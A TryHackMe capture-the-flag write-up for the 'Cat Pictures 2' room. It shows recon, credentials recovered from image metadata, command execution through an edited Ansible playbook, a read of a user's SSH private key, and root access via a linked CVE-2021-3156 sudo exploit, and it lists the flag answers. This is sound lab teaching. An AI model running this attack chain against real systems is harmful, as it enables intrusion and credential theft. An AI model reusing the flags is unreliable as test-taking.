# Cat Pictures 2 – TryHackMe Write-Up

## Intro

We start with an `nmap` scan and some recon:

```
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 64
80/tcp   open  http       syn-ack ttl 63
222/tcp  open  rsh-spx    syn-ack ttl 63
1337/tcp open  waste      syn-ack ttl 64
3000/tcp open  ppp        syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 64
```

We have:
- Port 22 (SSH)
- Ports 80 & 8080 (web & proxy)
- Other interesting ports: 222, 1337, 3000.

Let’s enumerate the website and domains. Using **Gobuster**, we find several directories.

<img width="1307" height="604" alt="Screenshot From 2025-05-19 20-59-12" src="https://github.com/user-attachments/assets/e08ff299-7505-40b2-be48-df89207e80c2" />

---

Exploring the main site, we check `robots.txt`, source code, and `view.php`.

While looking through the cat images, the first cat's description has something interesting.

<img width="1857" height="968" alt="Screenshot From 2025-05-19 20-58-06" src="https://github.com/user-attachments/assets/d18eab75-884e-462a-bdcf-befe5f245185" />

<img width="1857" height="920" alt="Screenshot From 2025-05-19 21-37-53" src="https://github.com/user-attachments/assets/8acb1b2d-ff56-4067-9852-11346faef58b" />


**Note to self:** strip metadata.  
Using `exiftool` on the image reveals more data.

<img width="594" height="784" alt="Screenshot From 2025-05-19 21-39-50" src="https://github.com/user-attachments/assets/0ab971fb-373c-4b43-add6-6ab857538f0b" />

We run:

```
strings f5054e97620f168c7b5088c85ab1d6e4.jpg | grep -Ei "flag|http|pass|key|cmd|bin|sh|base64|txt"
```

<img width="1217" height="165" alt="Screenshot From 2025-05-19 21-49-27" src="https://github.com/user-attachments/assets/952501df-cd73-42b0-87cd-bb0a57013240" />

From this, we visit:

```
http://cats.thm:8080/764efa883dda1e11db47671c4a3bbd9e.txt
```

We get:
```
gitea: port 3000
user: samarium
password: TUmhyZ37CLZrhP

ansible runner (olivetin): port 1337
```
<img width="1233" height="189" alt="Screenshot From 2025-05-19 21-50-28" src="https://github.com/user-attachments/assets/bfb5fb07-1855-48ef-b5a0-ffa0e4234ee4" />
<img width="1244" height="570" alt="Screenshot From 2025-05-19 21-55-42" src="https://github.com/user-attachments/assets/13208ecf-1814-4bc6-8f19-d08aa0c5bf8b" />


---

After logging in to **Gitea**, we see a repository named **ansible**. Inside is **Flag 1**.

<img width="1239" height="736" alt="Screenshot From 2025-05-19 21-55-48" src="https://github.com/user-attachments/assets/7a72f0af-7638-45a5-91a3-96ec415c7e99" />

---

Next, we go to:

```
http://cats.thm:1337/
```

<img width="1854" height="975" alt="Screenshot From 2025-05-19 21-57-54" src="https://github.com/user-attachments/assets/ae2e0ae5-0137-41f2-b38b-146eb29a801b" />


Running **Ansible** and checking logs reveals a user named **bismuth**.

<img width="1461" height="742" alt="Screenshot From 2025-05-19 22-01-17" src="https://github.com/user-attachments/assets/22d305b1-b784-482e-beea-bf1a820e71e2" />

We can edit `playbook.yaml` in the ansible repo to run our own commands:

```yaml
---
- name: Test 
  hosts: all
  remote_user: bismuth
  tasks:
    - name: get the username running the deploy
      become: false
      command: cat flag2.txt
      register: username_on_the_host
      changed_when: false

    - debug: var=username_on_the_host

    - name: Test
      shell: echo hi
```

Run the playbook in OliveTin and **Flag 2** appears.

---

We then grab the private key for SSH:

```
cat /home/bismuth/.ssh/id_rsa
```

<img width="1845" height="800" alt="Screenshot From 2025-05-19 22-14-11" src="https://github.com/user-attachments/assets/043000eb-7b71-4e70-b5d2-e3d68a94968e" />

After cleaning it up in **CyberChef**, we SSH into bismuth.

---

## Privilege Escalation

We find and use **CVE-2021-3156** (sudo heap-based buffer overflow):

Repo: [https://github.com/CptGibbon/CVE-2021-3156.git](https://github.com/CptGibbon/CVE-2021-3156.git)

Transfer it over:

```
scp -i id_bismuth -r CVE-2021-3156 bismuth@10.10.4.224:
```
<img width="1861" height="767" alt="Screenshot From 2025-05-19 22-22-45" src="https://github.com/user-attachments/assets/2d863d97-6eef-4e96-ac1a-da07e0999ee0" />

Run the exploit, and we obtain **Flag 3**.

<img width="1860" height="744" alt="Screenshot From 2025-05-19 23-02-33" src="https://github.com/user-attachments/assets/d9a96f86-c16d-43b7-aacf-5913dcb55413" />
---

## Tools Used

- **Nmap** – Port scanning & service detection
- **Gobuster** – Directory brute-forcing
- **Exiftool** – Metadata extraction
- **Strings** – Extracting hidden text in files
- **Gitea** – Source code access & flag retrieval
- **Ansible** – Remote command execution via playbooks
- **CyberChef** – Key cleanup
- **SSH** – Remote access
- **CVE-2021-3156 exploit** – Privilege escalation

---

## Key Takeaways

1. Always check image metadata for sensitive information.
2. Source code repositories can hold credentials and flags.
3. Misconfigured automation tools like Ansible can be leveraged for RCE.
4. Private keys should be protected; exposure means SSH access.
5. Known vulnerabilities (e.g., CVE-2021-3156) can quickly lead to root access.

---

## Flags

- **Flag 1:** `10d916eaea54bb5ebe36b59538146bb5`
- **Flag 2:** `5e2cafbbf180351702651c09cd797920`
- **Flag 3:** `6d2a9f8f8174e86e27d565087a28a971`
